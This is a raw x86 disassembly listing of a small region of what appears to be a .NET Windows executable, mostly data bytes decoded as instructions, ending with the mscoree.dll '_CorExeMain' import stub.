  40c20d:	20 02                	and    %al,(%edx)
  40c20f:	01 12                	add    %edx,(%edx)
  40c211:	80 c9 08             	or     $0x8,%cl
  40c214:	06                   	push   %es
  40c215:	20 01                	and    %al,(%ecx)
  40c217:	01 12                	add    %edx,(%edx)
  40c219:	80 f1 09             	xor    $0x9,%cl
  40c21c:	20 02                	and    %al,(%edx)
  40c21e:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c223:	80 f5 05             	xor    $0x5,%ch
  40c226:	20 02                	and    %al,(%edx)
  40c228:	08 08                	or     %cl,(%eax)
  40c22a:	08 06                	or     %al,(%esi)
  40c22c:	20 02                	and    %al,(%edx)
  40c22e:	01 12                	add    %edx,(%edx)
  40c230:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c235:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c238:	09 20                	or     %esp,(%eax)
  40c23a:	03 01                	add    (%ecx),%eax
  40c23c:	12 61 02             	adc    0x2(%ecx),%ah
  40c23f:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c245:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c24b:	01 0e                	add    %ecx,(%esi)
  40c24d:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c253:	02 09                	add    (%ecx),%cl
  40c255:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c258:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c25e:	0c 20                	or     $0x20,%al
  40c260:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c265:	08 08                	or     %cl,(%eax)
  40c267:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c26d:	01 11                	add    %edx,(%ecx)
  40c26f:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c275:	02 12                	add    (%edx),%dl
  40c277:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c27a:	02 08                	add    (%eax),%cl
  40c27c:	08 05 20 01 08 12    	or     %al,0x12080120
  40c282:	25 06 00 02 08       	and    $0x8020006,%eax
  40c287:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c28c:	03 08                	add    (%eax),%ecx
  40c28e:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c293:	20 01                	and    %al,(%ecx)
  40c295:	01 12                	add    %edx,(%edx)
  40c297:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c29d:	1c 0c                	sbb    $0xc,%al
  40c29f:	07                   	pop    %es
  40c2a0:	06                   	push   %es
  40c2a1:	1c 02                	sbb    $0x2,%al
  40c2a3:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c2a8:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c2ae:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c2b1:	02 07                	add    (%edi),%al
  40c2b3:	20 02                	and    %al,(%edx)
  40c2b5:	02 08                	add    (%eax),%cl
  40c2b7:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c2bd:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c2c3:	07                   	pop    %es
  40c2c4:	0a 12                	or     (%edx),%dl
  40c2c6:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2cd:	08 12 81 
  40c2d0:	41                   	inc    %ecx
  40c2d1:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2d7:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2dc:	4d                   	dec    %ebp
  40c2dd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2e2:	0e                   	push   %cs
  40c2e3:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2e8:	41                   	inc    %ecx
  40c2e9:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2ee:	55                   	push   %ebp
  40c2ef:	06                   	push   %es
  40c2f0:	00 00                	add    %al,(%eax)
  40c2f2:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2f7:	00 01                	add    %al,(%ecx)
  40c2f9:	0e                   	push   %cs
  40c2fa:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c2ff:	01 11                	add    %edx,(%ecx)
  40c301:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c308:	41                   	inc    %ecx
  40c309:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c30f:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c316:	49                   	dec    %ecx
  40c317:	0e                   	push   %cs
  40c318:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c31e:	0e                   	push   %cs
  40c31f:	0e                   	push   %cs
  40c320:	0e                   	push   %cs
  40c321:	0e                   	push   %cs
  40c322:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c327:	1c 07                	sbb    $0x7,%al
  40c329:	20 02                	and    %al,(%edx)
  40c32b:	01 0e                	add    %ecx,(%esi)
  40c32d:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c333:	0a 02                	or     (%edx),%al
  40c335:	10 07                	adc    %al,(%edi)
  40c337:	06                   	push   %es
  40c338:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c33e:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c344:	0e                   	push   %cs
  40c345:	02 05 20 00 12 81    	add    0x81120020,%al
  40c34b:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c351:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c357:	91                   	xchg   %eax,%ecx
  40c358:	04 20                	add    $0x20,%al
  40c35a:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c35d:	04 07                	add    $0x7,%al
  40c35f:	02 02                	add    (%edx),%al
  40c361:	02 03                	add    (%ebx),%al
  40c363:	20 00                	and    %al,(%eax)
  40c365:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c368:	02 18                	add    (%eax),%bl
  40c36a:	02 03                	add    (%ebx),%al
  40c36c:	07                   	pop    %es
  40c36d:	01 0e                	add    %ecx,(%esi)
  40c36f:	05 00 00 12 81       	add    $0x81120000,%eax
  40c374:	9d                   	popf
  40c375:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c37a:	1c 0a                	sbb    $0xa,%al
  40c37c:	07                   	pop    %es
  40c37d:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c382:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c387:	20 01                	and    %al,(%ecx)
  40c389:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c38f:	0e                   	push   %cs
  40c390:	08 08                	or     %cl,(%eax)
  40c392:	06                   	push   %es
  40c393:	07                   	pop    %es
  40c394:	02 02                	add    (%edx),%al
  40c396:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c39c:	0e                   	push   %cs
  40c39d:	0e                   	push   %cs
  40c39e:	0e                   	push   %cs
  40c39f:	05 20 00 11 81       	add    $0x81110020,%eax
  40c3a4:	ad                   	lods   %ds:(%esi),%eax
  40c3a5:	05 00 00 12 81       	add    $0x81120000,%eax
  40c3aa:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c3af:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c3b5:	02 11                	add    (%ecx),%dl
  40c3b7:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c3bd:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c3c4:	12 81 8d 
  40c3c7:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3cd:	12 41 01             	adc    0x1(%ecx),%al
  40c3d0:	0e                   	push   %cs
  40c3d1:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3d6:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3dc:	00 06                	add    %al,(%esi)
  40c3de:	00 02                	add    %al,(%edx)
  40c3e0:	0e                   	push   %cs
  40c3e1:	0e                   	push   %cs
  40c3e2:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3e7:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3ec:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3f2:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3f8:	c5 09                	lds    (%ecx),%ecx
  40c3fa:	00 02                	add    %al,(%edx)
  40c3fc:	02 11                	add    (%ecx),%dl
  40c3fe:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c404:	07                   	pop    %es
  40c405:	02 12                	add    (%edx),%dl
  40c407:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c40c:	01 02                	add    %eax,(%edx)
  40c40e:	0e                   	push   %cs
  40c40f:	10 02                	adc    %al,(%edx)
  40c411:	06                   	push   %es
  40c412:	00 01                	add    %al,(%ecx)
  40c414:	01 12                	add    %edx,(%edx)
  40c416:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c41c:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c423:	0e                   	push   %cs
  40c424:	1c 11                	sbb    $0x11,%al
  40c426:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c42c:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c433:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c439:	05 07 20 02 12       	add    $0x12022007,%eax
  40c43e:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c445:	12 60 0e             	adc    0xe(%eax),%ah
  40c448:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c44d:	12 60 12             	adc    0x12(%eax),%ah
  40c450:	60                   	pusha
  40c451:	06                   	push   %es
  40c452:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c457:	60                   	pusha
  40c458:	10 10                	adc    %dl,(%eax)
  40c45a:	01 01                	add    %eax,(%ecx)
  40c45c:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c461:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c467:	1e                   	push   %ds
  40c468:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c46b:	01 12                	add    %edx,(%edx)
  40c46d:	60                   	pusha
  40c46e:	09 20                	or     %esp,(%eax)
  40c470:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c476:	13 00                	adc    (%eax),%eax
  40c478:	07                   	pop    %es
  40c479:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c47e:	12 60 04             	adc    0x4(%eax),%ah
  40c481:	20 00                	and    %al,(%eax)
  40c483:	13 00                	adc    (%eax),%eax
  40c485:	05 20 01 02 13       	add    $0x13020120,%eax
  40c48a:	00 03                	add    %al,(%ebx)
  40c48c:	07                   	pop    %es
  40c48d:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c494:	e5 07                	in     $0x7,%eax
  40c496:	20 01                	and    %al,(%ecx)
  40c498:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c49e:	20 01                	and    %al,(%ecx)
  40c4a0:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c4a6:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c4a9:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c4af:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c4b5:	00 02                	add    %al,(%edx)
  40c4b7:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c4bd:	0e                   	push   %cs
  40c4be:	1c 00                	sbb    $0x0,%al
  40c4c0:	05 12 82 05 11       	add    $0x11058212,%eax
  40c4c5:	82 09 0e             	orb    $0xe,(%ecx)
  40c4c8:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4cd:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4d3:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4d8:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4de:	45                   	inc    %ebp
  40c4df:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4e5:	4d                   	dec    %ebp
  40c4e6:	1c 12                	sbb    $0x12,%al
  40c4e8:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4ed:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4f2:	0e                   	push   %cs
  40c4f3:	0b 00                	or     (%eax),%eax
  40c4f5:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4fb:	00 12                	add    %dl,(%edx)
  40c4fd:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c504:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c509:	4d                   	dec    %ebp
  40c50a:	1c 12                	sbb    $0x12,%al
  40c50c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c511:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c516:	0e                   	push   %cs
  40c517:	17                   	pop    %ss
  40c518:	20 0a                	and    %cl,(%edx)
  40c51a:	01 13                	add    %edx,(%ebx)
  40c51c:	00 13                	add    %dl,(%ebx)
  40c51e:	01 13                	add    %edx,(%ebx)
  40c520:	02 13                	add    (%ebx),%dl
  40c522:	03 13                	add    (%ebx),%edx
  40c524:	04 13                	add    $0x13,%al
  40c526:	05 13 06 13 07       	add    $0x7130613,%eax
  40c52b:	13 08                	adc    (%eax),%ecx
  40c52d:	13 09                	adc    (%ecx),%ecx
  40c52f:	05 07 01 12 82       	add    $0x82120107,%eax
  40c534:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c539:	0e                   	push   %cs
  40c53a:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c53f:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c545:	06                   	push   %es
  40c546:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c54c:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c552:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c557:	20 01                	and    %al,(%ecx)
  40c559:	01 11                	add    %edx,(%ecx)
  40c55b:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c562:	82 31 05             	xorb   $0x5,(%ecx)
  40c565:	20 00                	and    %al,(%eax)
  40c567:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c56d:	01 12                	add    %edx,(%edx)
  40c56f:	61                   	popa
  40c570:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c576:	08 20                	or     %ah,(%eax)
  40c578:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c57e:	08 1a                	or     %bl,(%edx)
  40c580:	07                   	pop    %es
  40c581:	0a 12                	or     (%edx),%dl
  40c583:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c58a:	21 1d 05 
  40c58d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c592:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c599:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c59e:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c5a4:	45                   	inc    %ebp
  40c5a5:	08 08                	or     %cl,(%eax)
  40c5a7:	04 07                	add    $0x7,%al
  40c5a9:	02 02                	add    (%edx),%al
  40c5ab:	08 09                	or     %cl,(%ecx)
  40c5ad:	00 02                	add    %al,(%edx)
  40c5af:	01 12                	add    %edx,(%edx)
  40c5b1:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c5b5:	4d                   	dec    %ebp
  40c5b6:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c5bb:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c5c1:	05 08 05 07 07       	add    $0x7070508,%eax
  40c5c6:	02 12                	add    (%edx),%dl
  40c5c8:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5cc:	08 07                	or     %al,(%edi)
  40c5ce:	04 12                	add    $0x12,%al
  40c5d0:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5d5:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5da:	1c 06                	sbb    $0x6,%al
  40c5dc:	07                   	pop    %es
  40c5dd:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5e3:	20 01                	and    %al,(%ecx)
  40c5e5:	13 00                	adc    (%eax),%eax
  40c5e7:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5ea:	01 12                	add    %edx,(%edx)
  40c5ec:	60                   	pusha
  40c5ed:	0e                   	push   %cs
  40c5ee:	07                   	pop    %es
  40c5ef:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5f4:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5fa:	12 60 07             	adc    0x7(%eax),%ah
  40c5fd:	07                   	pop    %es
  40c5fe:	04 08                	add    $0x8,%al
  40c600:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c605:	20 01                	and    %al,(%ecx)
  40c607:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c60d:	64 04 00             	fs add $0x0,%al
  40c610:	01 0b                	add    %ecx,(%ebx)
  40c612:	0a 04 00             	or     (%eax,%eax,1),%al
  40c615:	01 0b                	add    %ecx,(%ebx)
  40c617:	0e                   	push   %cs
  40c618:	04 00                	add    $0x0,%al
  40c61a:	01 0b                	add    %ecx,(%ebx)
  40c61c:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c621:	0c 06                	or     $0x6,%al
  40c623:	00 01                	add    %al,(%ecx)
  40c625:	0b 11                	or     (%ecx),%edx
  40c627:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c62e:	04 00 01 
  40c631:	0a 0e                	or     (%esi),%cl
  40c633:	04 00                	add    $0x0,%al
  40c635:	01 0a                	add    %ecx,(%edx)
  40c637:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c63c:	0c 06                	or     $0x6,%al
  40c63e:	00 01                	add    %al,(%ecx)
  40c640:	0a 11                	or     (%ecx),%dl
  40c642:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c649:	04 00 01 
  40c64c:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c651:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c655:	ad                   	lods   %ds:(%esi),%eax
  40c656:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c65b:	0c 07                	or     $0x7,%al
  40c65d:	07                   	pop    %es
  40c65e:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c664:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c669:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c66f:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c675:	12 60 1d             	adc    0x1d(%eax),%ah
  40c678:	0e                   	push   %cs
  40c679:	0e                   	push   %cs
  40c67a:	08 12                	or     %dl,(%edx)
  40c67c:	60                   	pusha
  40c67d:	08 05 07 01 12 81    	or     %al,0x81120107
  40c683:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c688:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c68f:	05 08 08 06 00       	add    $0x60808,%eax
  40c694:	02 07                	add    (%edi),%al
  40c696:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c69b:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c6a2:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c6a8:	00 02                	add    %al,(%edx)
  40c6aa:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c6b0:	02 0b                	add    (%ebx),%cl
  40c6b2:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6b7:	02 06                	add    (%esi),%al
  40c6b9:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6be:	02 0a                	add    (%edx),%cl
  40c6c0:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c6c5:	03 12                	add    (%edx),%edx
  40c6c7:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6ce:	07 02 12 
  40c6d1:	60                   	pusha
  40c6d2:	02 04 07             	add    (%edi,%eax,1),%al
  40c6d5:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6db:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6e0:	04 1d                	add    $0x1d,%al
  40c6e2:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6e7:	06                   	push   %es
  40c6e8:	07                   	pop    %es
  40c6e9:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6ef:	00 01                	add    %al,(%ecx)
  40c6f1:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6f6:	06                   	push   %es
  40c6f7:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c6fd:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c703:	05 08 20 02 01       	add    $0x1022008,%eax
  40c708:	12 61 11             	adc    0x11(%ecx),%ah
  40c70b:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c70f:	04 12                	add    $0x12,%al
  40c711:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c718:	1d 05 00 
  40c71b:	00 44 c7 00          	add    %al,0x0(%edi,%eax,8)
	...
  40c727:	00 5e c7             	add    %bl,-0x39(%esi)
  40c72a:	00 00                	add    %al,(%eax)
  40c72c:	00 20                	add    %ah,(%eax)
	...
  40c742:	00 00                	add    %al,(%eax)
  40c744:	50                   	push   %eax
  40c745:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c74b:	00 00                	add    %al,(%eax)
  40c74d:	00 00                	add    %al,(%eax)
  40c74f:	00 00                	add    %al,(%eax)
  40c751:	00 5f 43             	add    %bl,0x43(%edi)
  40c754:	6f                   	outsl  %ds:(%esi),(%dx)
  40c755:	72 45                	jb     0x40c79c
  40c757:	78 65                	js     0x40c7be
  40c759:	4d                   	dec    %ebp
  40c75a:	61                   	popa
  40c75b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c762:	72 65                	jb     0x40c7c9
  40c764:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c768:	6c                   	insb   (%dx),%es:(%edi)
  40c769:	00 00                	add    %al,(%eax)
  40c76b:	00 00                	add    %al,(%eax)
  40c76d:	00 ff                	add    %bh,%bh
  40c76f:	25 00 20 40 00       	and    $0x402000,%eax
